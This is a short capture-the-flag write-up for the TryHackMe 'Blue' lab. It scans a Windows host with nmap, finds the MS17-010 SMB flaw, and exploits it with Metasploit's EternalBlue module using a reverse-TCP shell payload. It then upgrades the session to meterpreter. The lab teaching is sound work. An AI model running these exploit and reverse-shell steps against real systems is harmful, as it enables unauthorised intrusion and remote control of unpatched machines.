# [Blue](https://tryhackme.com/room/blue)

> Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

## Scanning

scan the machine

```
nmap -A -T4 10.10.92.237
```

![image](https://user-images.githubusercontent.com/90561566/200109367-28962f61-8943-4d14-8a73-9e5d964af0d3.png)

We can see it's a windows machine name Jon-PC and 3 port under 1000 is opening

![image](https://user-images.githubusercontent.com/90561566/200109397-8209737a-a141-42ab-b58d-0fd91247e152.png)

Nmap also find a lot of vulnerabilities (seem about smb vuln)

```
nmap --script=vuln -T4 10.10.92.237
```

![image](https://user-images.githubusercontent.com/90561566/200109617-23ce7abd-c8a3-4729-bd8b-31bfde219ef9.png)

the answer is CVE-2017-0143 (ms17-010)

## Exploitation

Start Metasploit and use module exploit/windows/smb/ms17_010_eternalblue 

```
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
```

![image](https://user-images.githubusercontent.com/90561566/200110267-d066ba86-1cd8-4301-b7f4-e7e3c3dd3408.png)

now we need to set RHOSTS

```
set RHOSTS 10.10.92.237
set payload windows/x64/shell/reverse_tcp
exploit
```

if failed, try reboot the target machine or set LHOST with your openvpn ip

background session

![image](https://user-images.githubusercontent.com/90561566/200110728-b322a970-d94b-489c-a342-f782c011b32f.png)

## Privilege Escalation

now, we need convert shell to meterpreter

```
use post/multi/manage/shell_to_meterpreter
set session 1
exploit
```














.

| Flag | root.txt |
| --- | --- |
| Answer | <flag> |
